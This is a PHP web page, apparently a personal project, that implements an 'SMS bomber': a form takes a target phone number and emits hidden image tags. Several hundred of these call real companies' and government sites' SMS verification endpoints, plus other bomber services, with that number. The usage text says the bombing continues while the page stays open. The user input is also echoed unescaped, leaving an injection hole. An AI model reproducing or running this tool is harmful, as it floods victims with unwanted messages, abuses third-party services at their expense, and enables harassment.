<?php
$tips="点击开始进行轰炸，点击停止结束轰炸";
?>
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Kit Chen">
    <title>简易短信轰炸机-Kit Chen</title>
    <link rel="stylesheet" type="text/css" href="css/index.css">
    <meta name="theme-color" content="#563d7c">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }

        body {
            min-height: 75rem;
            padding-top: 4.5rem;
        }
    </style>
</head>

<body>
<nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
    <a class="navbar-brand" href="#">简易短信轰炸机-Kit Chen</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>

    <div class="collapse navbar-collapse" id="navbarsExampleDefault">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
                <a class="nav-link" href="#">主页 <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="pan">网盘</a>
            </li>
            <li class="nav-item">
                <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true">Disabled</a>
            </li>
            <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle disabled" href="#" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Dropdown</a>
                <div class="dropdown-menu" aria-labelledby="dropdown01">
                    <a class="dropdown-item" href="#">Action</a>
                    <a class="dropdown-item" href="#">Another action</a>
                    <a class="dropdown-item" href="#">Something else here</a>
                </div>
            </li>
        </ul>
        <form class="form-inline my-2 my-lg-0">
            <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
            <button class="btn btn-secondary my-2 my-sm-0" type="submit">Search</button>
        </form>
    </div>
</nav>
<main role="main" class="container mt-50">
    <div class="jumbotron">
        <h1>写着玩</h1>
        <p class="lead">学习一下轰炸机的原理</p>
        <form action="/" method="post">
            <div class="form-group">
                <label for="phone">手机号</label>
                <input type="text" class="form-control" id="phone" name="phone" aria-describedby="emailHelp">
                <small class="form-text text-muted">使用说明：输入手机号，点击开始，不要点停止，不关闭网页就会一直轰炸。</small>
                <?php if (!empty($_POST)) {
                   $phone=$_POST["phone"];
                    $tips="正在进行轰炸".$phone."中...点击停止或者关闭网页结束轰炸";
                   echo "<div style=\"display:none\"><img src='http://h.zy40.cn/dx/index.php?hm=$phone' alt=''/>
<img src='http://dx.zy40.cn/dx/index.php?hm=$phone' alt=''/>
<img src='http://m.zy40.cn/dx/index.php?hm=$phone' alt=''/>
<img src='http://qqz.xiaojiangwl.com/?yChgSnXh=$phone' alt=''/>
<img src='http://cthwallet.com/en/data/dy/index.php?hm=$phone' alt=''/>
<img src='http://hezi.ainide.cn/hzq/lt213.php?hm=$phone' alt=''/>
<img src='http://zgtv.spo38.igeek.gq/aip/index3.php?hm=$phone' alt=''/>
<img src='api.php?hm=$phone' alt=''/>
<img src='http://hezi.ainide.cn/hzq/lt213.php?hm=$phone' alt=''/>
<img src='http://api.nfapp.southcn.com/nanfang_if/getVerifiCode?phoneNo=$phone' alt=''/>
<img src='http://www.yaya.cn/tools/web_submit.ashx?action=reg_get_mobile_code&mobile=$phone' alt=''/>
<img src='https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=$phone' alt=''/>
<img src='http://www.edu-edu.com/cas/web/message/send?phone=$phone' alt=''/>
<img src='http://id.ifeng.com/api/simplesendmsg?mobile=$phone' alt=''/>
<img src='http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile=$phone' alt=''/>
<img src='https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone=$phone' alt=''/>
<img src='http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile=$phone&comefrom=7&auth=&msgtype=0' alt=''/>
<img src='https://www.baixing.com/oz/verify/reg?mobile=$phone&businessType=register_captcha_code' alt=''/>
<img src='http://www.songhebao.com/serv/api/member/GetSMSCode.ashx?phone=$phone' alt=''/>
<img src='http://passport.kuaichecaifu.com/UserForDeayou/phoneCode?callbackparam=jsonpReturn&phone=&agent=$phone&_=1500773935216' alt=''/>
<img src='http://passport.centanet.com/m/page/ajax/20C79442F06E.ashx?Act=SetCode&phone=$phone' alt=''/>
<img src='https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&amp;phone=$phone' alt=''/>
<img src='http://114.55.104.205/api/auth/send?mobile=&amp;access_token=$phone' alt=''/>
<img src='http://api.qingmang.me/v1/account.sendVerification?code=1566478386.8872059778&amp;phone=$phone' alt=''/>
<img src='http://user.daojia.com/mobile/getcode?mobile=$phone' alt=''/>
<img src='http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile=$phone' alt=''/>
<img src='https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber=$phone' alt=''/>
<img src='http://slb-sport.vesal.cn/vesal-sport-prod/v1/app/member/getCode?tellAndEmail=$phone' alt=''/>
<img src='http://cms.51fenmi.com/api/base/public/getCode?mobile=$phone' alt=''/>
<img src='http://211.156.201.12:8088/youzheng//ems/security?phone=$phone' alt=''/>
<img src='http://www.baixing.com/m/oz/verify/?fromS9=1&identity=$phone&mobile=$phone' alt=''/>
<img src='http://www.52gcc.com/bomb/index.php?hm=$phone' alt=''/>
<img src='http://shxd.jienihua100.com/api/user/getcode?mobile=$phone&regcode=AC04B8AE-5A73-41D1-8694-3EFD04FEB059' alt=''/>
<img src='http://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=$phone' alt=''/>
<img src='http://api.v2.msparis.com/common/mobile?channel=App%20Store-vest&clientId=msparis-ios-4.2.4-vest&mobile=$phone&platform=ios-vest&rent_mode=2' alt=''/>
<img src='http://ttq.api.yolanda.hk/api/v5/users/identifying_code.json?address=&app_id=TTQ&app_revision=2.2.2&cellphone_type=iPhone%206s-12.4&login=$phone&mob_type=1&platform=iphone&send_type=1&systemLaunguage=zh-Hans-CN' alt=''/>
<img src='http://b2c.csair.com/portal/smsMessage/EUserVerifyCode?mobile=$phone' alt=''/>
<img src='https://user.daojia.com/mobile/getcode?mobile=$phone&amp;newVersion=1&amp;bu=112' alt=''/>
<img src='https://user.meilimei.com/taomi/user/sendSmsCaptcha?mobile=$phone' alt=''/>
<img src='http://api.v2.msparis.com/common/mobile?channel=App%20Store-vest&clientId=msparis-ios-4.2.4-vest&mobile=$phone&platform=ios-vest&rent_mode=2' alt=''/>
<img src='https://webapi.account.mihoyo.com/Api/create_mobile_captcha?action_ticket=&action_type=regist&mobile=$phone' alt=''/>
<img src='http://sapi.16888.com/app.php?mod=account&extra=mobileCode&mobile=$phone' alt=''/>
<img src='https://passport.eqxiu.com/eqs/sms/token?phone=$phone&type=quickLogin&checkPhone=1&channel=21&version=4.4.1' alt=''/>
<img src='http://www.weimaiyy.com/register/sms?t=0.6886729517940704&phone=$phone' alt=''/>
<img src='http://srmemberapp.srgow.com/sys/captcha/$phone' alt=''/>
<img src='http://case.100.com/captcha?source=57&mobile=$phone&resend=0&mkey=customer' alt=''/>
<img src='https://jdapi.jd100.com/uc/v1/getSMSCode?account=$phone&sign_type=1&use_type=1' alt=''/>
<img src='https://flights.sichuanair.com/3uair/ibe/profile/processSendSMSNew.do?ConversationID=&smsType=REGISTER&mobilePhone=$phone&verkey=MOBILELOGIN' alt=''/>
<img src='https://user.daojia.com/mobile/getcode?mobile=$phone&newVersion=1&bu=103' alt=''/>
<img src='https://pass.cctalk.com/intraApi/v1/sms/send?action=SendMsg&mobile=%2B86-$phone&imgcode=&token=aa315477956d459f40b6f26c9090b790&sendtype=mobilemsgpwd&msgtype=1&captchaVersion=2&user_domain=cc&business_domain=&hpuid=924-ECmHmDZ0xdhMnXe-43&callback=reqwest_1589532775907030687' alt=''/>
<img src='https://services.qiye.163.com/service/official/sendCode?jsonpcallback=jQuery190039810459070645865_1584688891341&mobile=$phone&_=1584688891342' alt=''/>
<img src='http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum=$phone' alt=''/>
<img src='https://www.771ka.com/register/checkinfo?clientid=newmobile&newmobile=$phone&_=1589617672457' alt=''/>
<img src='http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile=$phone' alt=''/>
<img src='http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=$phone' alt=''/>
<img src='http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=$phone' alt=''/>
<img src='http://slb-sport.vesal.cn/vesal-sport-prod/v1/app/member/getCode?tellAndEmail=$phone' alt=''/>
<img src='http://activity.renren.com/livecell/ajax/tryVerify?sanbox=a&phoneNum=$phone' alt=''/>
<img src='http://www.gangaimall.com/mbb-web/api/account/code?mobile=$phone&type=0' alt=''/>
<img src='http://api.qingmang.me/v1/account.sendVerification?code=1566478386.8872059778&phone=$phone' alt=''/>
<img src='http://v.juhe.cn/sms/send?mobile=$phone&tpl_id=11115&tpl_value=' alt=''/>
<img src='http://api.passport.pptv.com/snsms/sendcode?cb=msSendCode&phoneNumber=$phone&deviceId=p_1584518586025_48072460278550296&terminal=PC&channel=208000103005&uuid=0e2a64ae-e07e-49d6-852e-3de883df8003&imgCode=&format=jsonp&_=1584518959802' alt=''/>
<img src='http://www.guaguale.men/api.php?act=user&key=rt1BThTaqQjjqbx1RD&phone=$phone' alt=''/>
<img src='http://www.txooo.com/Txooo/Main/BusinessRequirement/Ajax/BusinessRequirementAjax.ajax/SendMobileCode?mobile=$phone' alt=''/>
<img src='http://www.xlcidc.com/chkName.asp?umobie=$phone&lm=sendmobi&sd=0.5806221691630391' alt=''/>
<img src='http://www.imdxd.com/api/method/getCode?phone=$phone&type=2' alt=''/>
<img src='https://m.jf.10010.com/wx006/jf-auth/wx/getCaptcha/$phone' alt=''/>
<img src='https://john.ixiaolu.com/account/check_account_name?ab_ver=A&account_name=86-$phone&app_channel=&device=iPhone8%2C1&device_id=5C351103-F887-4932-BC59-58C75875EFDE&login_user_id=0&pcid=ae1895f8187711a6bf727e6d14b0588d&phone_sn=9e633777bc1a27c4cb826b1a4c6309dd34eb80' alt=''/>
<img src='https://pass.cctalk.com/intraApi/v1/sms/send?action=SendMsg&business_domain=yyy_cctalk&captchaVersion=2&hpuid=785-0bCp21yf6XXmRiz-40&imgcode=&isapp=true&mobile=+86-$phone&msgtype=1&sendtype=mobilemsgpwd&token=3cab2a2b042928518869ab9fee57ce03&user_domain=cc' alt=''/>
<img src='http://uac.10010.com/oauth2/OpSms?callback=jsonp1557631709566&req_time=&user_id=$phone&app_code=ECS-2233&msg_type=01' alt=''/>
<img src='http://ttq.api.yolanda.hk/api/v5/users/identifying_code.json?address=&app_id=TTQ&app_revision=2.2.2&cellphone_type=iPhone%206s-12.4&login=$phone&mob_type=1&platform=iphone&send_type=1&systemLaunguage=zh-Hans-CN' alt=''/>
<img src='http://shxd.jienihua100.com/api/user/getcode?mobile=$phone&regcode=AC04B8AE-5A73-41D1-8694-3EFD04FEB059' alt=''/>
<img src='http://www.weimaiyy.com/register/sms?t=0.6886729517940704&phone=$phone' alt=''/>
<img src='https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx?phoneNo=$phone&amp;showtopbar=true&amp;DeviceType=E&amp;Version=7.1.2&amp;SystemVersion=6.0.1&amp;behavior_entryid=lgf005001' alt=''/>
<img src='http://z.7qi.me/index.php?call=$phone&ok=' alt=''/>
<img src='https://qxin.info/oldfile/zha.php?NUMBER=$phone&c=1&ok=' alt=''/>
<img src='http://www.jiqinging.com/ajax.php?do=getCheckCode&tel=$phone' alt=''/>
<img src='https://api.daishangqian.com/v3/user/send-sms-code?phone=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?mobile=$phone' alt=''/> 
<img src='http://account.bababus.com/wap/sendDynamicVerifyCode.htm?mobilePhone=$phone' alt=''/>
<img src='http://n.youyuan.com/v20/yuan/get_registerMobile_code.html?mobile=$phone' alt=''/>
<img src='http://passport.centanet.com/m/page/ajax/20C79442F06E.ashx?Act=SetCode+phone=$phone' alt=''/>
<img src='https://passport.1yyg.com/JPData?action=send2Msg+userMobile=$phone' alt=''/> 
<img src='http://www.100ppi.com/ecp/ppi/get_sf/get_yzm.php?m=$phone' alt=''/>
<img src='http://www.suicunsuiqu.com/front/account/verifyMobileReg?mobile=$phone' alt=''/> <img src='http://www.900index.com/api.php?a=sendsms+m=index+mobile=$phone' alt=''/>
<img src='http://mall.yyfq.com/installment/fws/user/sendMobileCode?mobile=$phone' alt=''/> 
<img src='http://5.9188.com/activity/activityMobileCheck.go?id=qzkj&mobileno=$phone' alt=''/>
<img src='http://h5.gmccopen.com/act/sso!sendSms.action?mobile=$phone' alt=''/>
<img src='https://www.dfcd168.com/checkAndSendSms.html?mobile=$phone' alt=''/> 
<img src='http://www.taoguba.com.cn/sendCodePC?codeType=ZCYZ+phoneNumber=$phone' alt=''/> 
<img src='http://zntouzi.com/front/account/verifyMobileForReg?randomID=d2b07acd-917c-4d81-a849-9c694f25833b&code=111111&mobile=$phone' alt=''/>
<img src='http://www.jiqinging.com/ajax.php?do=getCheckCode+tel=$phone' alt=''/>
<img src='http://www.900index.com/api.php?a=sendsms&m=index&mobile=http://wjy138.haodai26.cn/sms.php?tel=$phone' alt=''/>
<img src='https://www.sztianjinsuo.com/user/sendPhoneCode?smsType=register&phone=$phone' alt=''/>
<img src='http://home.ecook.cn/user/code?phone=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://api.pintx.cn/User/SendCommonSms?user_tel=$phone' alt=''/>
<img src='http://m.yunqiandai.com/mobileCode/sendMobileCodeV/reg?phone=$phone' alt=''/>
<img src='http://channel.xianjinxia.com/act/light-loan-xjx/registerCodeV3?picCode=0&phone=$phone' alt=''/>
<img src='http://www.yigongkeji.cc/mobile/weixiu/view/member/getSmsCode?mobile=$phone' alt=''/>
<img src='http://www.youmw.top/tool/dxhz/?hm=$phone' alt=''/>
<img src='http://www.ttpai.cn/signup/success?mobile=$phone' alt=''/>
<img src='http://appsfunc.e-giordano.com/SVC/AppsFunc.svc/rest/CheckUserName?username=$phone' alt=''/>
<img src='http://zhg.zhuyousoft.com/index.php?s=/Sms/sendSms&phone=$phone' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://hdh.10086.cn/common/validationIP?phone=$phone' alt=''/>
<img src='http://tel.kuaishang.cn/cl.php?tel=$phone' alt=''/>
<img src='http://passport.lotour.com/reg/sendPhoneCode?callback=jQuery183022448778548277915_1465551896265&mobile=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=$phone' alt=''/>
<img src='http://yangba.syoogame.com/ajax/sendMobileVerifyCode?mobile=$phone' alt=''/>
<img src='http://www.sxyj.net/WebApi/Phone/SendPhone?phone=$phone' alt=''/>
<img src='http://www.team520.com/ddos/index.php?hm=$phone' alt=''/>
<img src='http://www.qmango.com/users/ajax/ajax_register_code.asp?_=1487743660579&mobile=$phone' alt=''/>
<img src='http://woa.sdo.com/woa/autologin/receiveVerificationSms.shtm?phone=$phone' alt=''/>
<img src='http://jx.kuwo.cn/KuwoLivePhone/user/sendSMS?mobile=$phone' alt=''/>
<img src='http://passport.fang.com/loginsendmsm.api?callback=jsonp1475917947591&Service=home-club-web&backurl=&mobilephone=$phone' alt=''/>
<img src='http://www.gghzj.cc/dx/dx/mini/index.php?hm=$phone' alt=''/>
<img src='http://www.yingegou.cn//api/v2/user/getSmsCode.do?mobile=$phone' alt=''/>
<img src='http://m.cibyun.com/User/SendRegistCCP?MemberUserId=-1&SellerUserId=null&X-Requested-By=m.cibyun.com&X-Requested-Data=qmjiyephkstunetjbbx&phone=$phone' alt=''/>
<img src='http://spi.lakala.com/wechat/weixin/signUp/getSMSCode.do?Mobile=$phone' alt=''/>
<img src='http://5.9188.com/user/sendSms.go?mobileNo=$phone' alt=''/>
<img src='http://user.memeyule.com/authcode/send_mobile?china=true&mobile=$phone' alt=''/>
<img src='http://api.yoyo360.cn/rest/authcode/send.json?18286967362=$phone' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/portals/cxfw/checkusermobile.jsp?mobilephone=$phone' alt=''/>
<img src='http://dns.shboka.com:22009/F-ZoneService/getValidNumber?phone=$phone' alt=''/>
<img src='http://user.zhangyoubao.com/passwords/getVerifyCode?mobile=$phone' alt=''/>
<img src='http://api.yinka.co/common/sms?cellphone=$phone' alt=''/>
<img src='http://www.jc258.cn/signup/send_sms?mobile=$phone' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone' alt=''/>
<img src='http://vipapp.yunjiweidian.com/yunjiapp4buyer/app4buyer/generateSmsCode.json?phone=$phone' alt=''/>
<img src='http://m.egou.com/validate_phone.htm?phone=$phone' alt=''/>
<img src='http://www.51zouchuqu.com/sms/send?mobileNo=$phone' alt=''/>
<img src='http://api.hhyp58.com/basis/sendCheckCode?mobile=$phone' alt=''/>
<img src='http://www.lawyersuperman.com/checkCellphone?cellphone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://api.beequick.cn/logging/beforeVerifySMS?msisdn=$phone' alt=''/>
<img src='http://pubacc.mobile.qq.com/mqqweb-pubacc/mqqweb/cgi-bin/lightalk/msgnewsend?phone=$phone' alt=''/>
<img src='http://home.ecook.cn/user/code?phone=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://api.pintx.cn/User/SendCommonSms?user_tel=$phone' alt=''/>
<img src='http://m.yunqiandai.com/mobileCode/sendMobileCodeV/reg?phone=$phone' alt=''/>
<img src='http://channel.xianjinxia.com/act/light-loan-xjx/registerCodeV3?picCode=0&phone=$phone' alt=''/>
<img src='http://www.yigongkeji.cc/mobile/weixiu/view/member/getSmsCode?mobile=$phone' alt=''/>
<img src='http://www.youmw.top/tool/dxhz/?hm=$phone' alt=''/>
<img src='http://www.ttpai.cn/signup/success?mobile=$phone' alt=''/>
<img src='http://www.jsvideo.tv/sendMsg?phone=$phone' alt=''/>
<img src='http://u.danongchang.cn/User/CheckUserMess.aspx?type=3&dhhm=$phone' alt=''/>
<img src='http://appsfunc.e-giordano.com/SVC/AppsFunc.svc/rest/CheckUserName?username=$phone' alt=''/>
<img src='http://zhg.zhuyousoft.com/index.php?s=/Sms/sendSms&phone=$phone' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$phone' alt=''/>
<img src='http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp=$phone' alt=''/>
<img src='http://hdh.10086.cn/common/validationIP?phone=$phone' alt=''/>
<img src='http://tel.kuaishang.cn/cl.php?tel=$phone' alt=''/>
<img src='http://passport.lotour.com/reg/sendPhoneCode?callback=jQuery183022448778548277915_1465551896265&mobile=$phone' alt=''/>
<img src='http://biz.sandnes.cn/msgapi.php?phone=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=$phone' alt=''/>
<img src='http://47.88.105.195:8080/admin-web/buyers/getVercode.htm?mobile=$phone' alt=''/>
<img src='http://www.edu-edu.com/cas/web/message/send?phone=$phone&isNewPhone=true' alt=''/>
<img src='https://api.guanggao.com/user/sendcheckcode?mobile=$phone&val=&type=0&platform=Android' alt=''/>
<img src='https://v4.passport.sohu.com/i/smcode/mobile/sblmobile?mobile=$phone&way=1&appid=116005&callback=passport403_cb1596534389025&_=1596534591810' alt=''/>
<img src='https://bj.yqbiao.com/UserInfoArea/Users/GetSmsCodeForReg?tel=$phone' alt=''/>
<img src='https://m.ke.qq.com/cgi-bin/tool/apply_sms_code?is_ios=0&raw_phone=$phone&phone=$phone&national_code=86&from=1&bkn=1557826707&_=1596758267792' alt=''/>
<img src='https://v4.passport.sohu.com/i/smcode/mobile/sblmobile?mobile=$phone&way=1&appid=116005&callback=passport403_cb1596534389025&_=1596534591810' alt=''/>
<img src='https://uac.10010.com/portal/Service/SendMSG?callback=jQuery17205960549095114636_1596719990361&req_time=1596720031540&mobile=$phone&unicom_number=0&_=1596720031543' alt=''/>
<img src='https://m.300.cn/verify/message?is_ajax=1&callback=jQuery19109805433584210501_1596669590055&mobile=$phone&_=1596669590060' alt=''/>
<img src='https://api.rrsjk.com/oauth2/sms/send_vertify_code.do?mobile=$phone&captcha=&captcha_id=' alt=''/>
<img src='https://api.rrsjk.com/oauth2/sms/send_vertify_code.do?mobile=$phone&captcha=&captcha_id=' alt=''/>
<img src='http://m.login.httpcn.com/login/LoginCode?callbackparam=jQuery111106766551584217104_1592824186799&val=$phone&_=1592824186801' alt=''/>
<img src='http://gj.liansuosoft.com/ShopRegister/SendSms?mobile=$phone' alt=''/>
<img src='https://www.d7w.net/index.php?g=Member&m=Api&a=getmobilecode_binding&j=json&mobile=$phone' alt=''/>
<img src='https://www.zx123.cn/member/register.php?action=getcode&ajax=1&mobile=$phone' alt=''/>
<img src='https://sso.agora.io/api/verify/sms?phone=%2B86+131+5822+6398&lang=cn&country=CN&captcha=$phone' alt=''/>
<img src='http://dopzuul.dd2007.cn/shangji/officeWebInterface/getYzmByMobile.dd?mobile=$phone&jsoncallback=jsonpCallback_success&_=1599135066051' alt=''/>
<img src='https://host.convertlab.com/sms/get?mobile=$phone&name=Convertlab&token=4080fdef3cb44298852d226af95b2502&type=form&uuid=4a48dbfe8e1d49ab87715d2ed8e6e79d' alt=''/>
<img src='https://www.tuiyizx.com/v2/cellphone/?m=get&cellphone=%2B86%20$phone&action=check' alt=''/>
<img src='https://user.daojia.com/mobile/getcode?mobile=$phone&newVersion=1&bu=112' alt=''/>
<img src='http://api.qingmang.me/v1/account.sendVerification?token=&phone=%2B86$phone&code=70428334' alt=''/>
<img src='http://walk-prod.bohanyuedong.com/api/message/sendV2?phone=$phone&app_id=2&timestamp=1599549118&channel_id=000&device_id=F9D6949590A78676215E2CD28D7539342F42B1A8&os=25&version=1.0.1&sign=af2b1f5cd686f61176655c7528819b26&imei=861271047037119&imei_device_id=94086F8106D8651CDC5B90160F11B56BD0AECC00' alt=''/>
<img src='http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=$phone&callback=jQuery17209171715653229815_1599374652809&_=1599374671117' alt=''/>
<img src='https://www.znds.com/plugin.php?id=tshuz_smslogin:mobile&mod=send&phone=$phone&type=1&hash=e5038cde' alt=''/>
<img src='https://prod.huohuaschool.com/api-website/user/sms?phone=$phone&type=6' alt=''/>
<img src='http://puser.hnzwfw.gov.cn:8081/api/user/sms?mobile=$phone&_=1592528454449' alt=''/>
<img src='https://www.114yygh.com/web/common/verify-code/get?_time=1592546859053&mobile=$phone&smsKey=LOGIN' alt=''/>
<img src='http://sa.ec-ego.com:8080/sms/smsCode/getCode?mobilePhone=$phone&type=register&exp=JMS' alt=''/>
<img src='http://srmemberapp.srgow.com/sys/captcha/$phone
http://gj.liansuosoft.com/ShopRegister/SendSms?mobile=$phone' alt=''/>
<img src='https://api-v5-0.yangcong345.com/captchas/v4.8?phone=$phone&code=CN&type=codeVerify' alt=''/>
<img src='http://srmemberapp.srgow.com/sys/captcha/$phone' alt=''/>
<img src='http://juniorapi.gzxiangqi.cn/juniorAccounts/v2/getCode/3/$phone' alt=''/>
<img src='http://uss.lenovomm.com/accounts/1.4/sendVerifyCode?msisdn=$phone' alt=''/>
<img src='http://juniorapi.gzxiangqi.cn/juniorAccounts/v2/getCode/3/$phone' alt=''/>
<img src='' alt=''/>
<img src='https://api.rrsjk.com/oauth2/sms/send_vertify_code.do?mobile=$phone&captcha=&captcha_id=' alt=''/>
<img src='http://srmemberapp.srgow.com/sys/captcha/$phone' alt=''/>
<img src='https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$phone' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=$phone&appId=www_home&v=2&sig=&t=1592615855903&v=2' alt=''/>
<img src='https://login.koolearn.com/sso/sendVoiceRegisterMessage.do?callback=jQuery111205661385064312077_1594952633553&type=jsonp&mobile=$phone&msgInterval=60&imageCode=&countryCode=86&country=CN&_=1594952633566' alt=''/>
<img src='https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18303956739664829656_1592495501835&phone=$phone&type=5&nation=CN&from_domain=yjs_h5&verifycode=&_=1592495526803' alt=''/>
<img src='https://m.exmail.qq.com/cgi-bin/sell_dependent?action=send_sms&t=wap_official_mgr&ef=jsnew&type=6&area=86&mobile=$phone&r=0.6184749692742786' alt=''/>
<img src='https://graph.3vjia.com/captcha/mobile/reg/$phone?moblieImgCaptcha=' alt=''/>
<img src='http://walk-prod.bohanyuedong.com/api/message/sendV2?phone=$phone&app_id=2&timestamp=1599549118&channel_id=000&device_id=F9D6949590A78676215E2CD28D7539342F42B1A8&os=25&version=1.0.1&sign=af2b1f5cd686f61176655c7528819b26&imei=861271047037119&imei_device_id=94086F8106D8651CDC5B90160F11B56BD0AECC00' alt=''/>
<img src='http://yangba.syoogame.com/ajax/sendMobileVerifyCode?mobile=$phone' alt=''/>
<img src='http://www.sxyj.net/WebApi/Phone/SendPhone?phone=$phone' alt=''/>
<img src='http://m.xymens.com/index.php/Home/User/send_code?mobile=$phone' alt=''/>
<img src='http://e.huijimall.com/api/store/rest/v2/zhutest/request_login_smscode?mobile=$phone' alt=''/>
<img src='http://passport.fang.com/loginsendmsm.api?MobilePhone=$phone' alt=''/>
<img src='http://www.ehuu.com/apiv4/clientApicheckPhone?phoneNum=$phone' alt=''/>
<img src='http://wo10010sh.cn/ticket/?a=$phone' alt=''/>
<img src='http://cash.herjk.com/herjk-server/user/authcode?mobile=$phone' alt=''/>
<img src='http://mall.yyfq.com/installment/fws/user/sendMobileCode?mobile=$phone' alt=''/>
<img src='http://h5.gmccopen.com/act/sso!sendSms.action?mobile=$phone' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$phone' alt=''/>
<img src='http://www.maizjr.com/register/identifyingcode.json?mobile=$phone' alt=''/>
<img src='http://13668291681.ftxmall.net/sms/send?mobile=$phone' alt=''/>
<img src='https://www.limi88.com/get_request_sms_times?phone=$phone' alt=''/>
<img src='http://passport.fang.com/loginsendmsm.api?MobilePhone=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://m.yunqiandai.com/mobileCode/sendMobileCodeV/reg?phone=$phone' alt=''/>
<img src='http://www.happigo.com/shop/index.php?act=login&op=send_auth_code&mobile=$phone' alt=''/>
<img src='http://tools.wx6.org/dianhuahongzhaji/?telcode=$phone' alt=''/>
<img src='http://u.danongchang.cn/User/CheckUserMess.aspx?type=3&dhhm=$phone' alt=''/>
<img src='http://118.178.230.82:8081/front/smsLogin.do?sign=2688a8ff469c6a19aeff8c70cfd5444e&platformCode=HUIYING&stime=1483258437244&token=35228404066186&smsType=LOGIN_VERIFY&cell=$phone' alt=''/>
<img src='http://zhg.zhuyousoft.com/index.php?s=/Sms/sendSms&phone=$phone' alt=''/>
<img src='http://ser.syccy.com/PhoneApi/NewSendMemberCodeForSMS?Phone=$phone' alt=''/>
<img src='http://www.yingegou.cn//api/v2/user/getSmsCode.do?mobile=$phone' alt=''/>
<img src='http://tel.kuaishang.cn/cl.php?tel=$phone' alt=''/>
<img src='http://www.weloan.com/front/account/verifyMobile?mobile=$phone' alt=''/>
<img src='http://interface.flnet.com/IAccount/GetRegisterSMSCode?cellphone=$phone' alt=''/>
<img src='http://api.yinka.co/common/sms?cellphone=$phone' alt=''/>
<img src='api.php?hm=$phone' alt=''/>
<img src='http://tools.wx6.org/duanxinhongzhaji/?telcode=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone' alt=''/>
<img src='http://api.duo17.com/sendsms.do?os_type=android&app_version=2.4.0.0&device_id=860903034476097&pnum=$phone' alt=''/>
<img src='http://m.yunqiandai.com/mobileCode/sendMobileCodeV/reg?phone=$phone' alt=''/>
<img src='http://www.happigo.com/shop/index.php?act=login&op=send_auth_code&mobile=$phone' alt=''/>
<img src='http://www.gghzj.cc/dx/dx/mini/index.php?hm=$phone' alt=''/>
  <img src='http://mkxq.zymk.cn/user/v1/mobilevc/?callback=jQuery321016123103253181426_1503210785449&mobile=$phone&service=mkn&_=1503210785451 ' alt=''/>
  <img src='http://www.atmyjr.com/user/ashx/ajax.ashx?action=telyuyin&mid=17433&v=1439377001052&txtMobile=$phone' alt=''/>
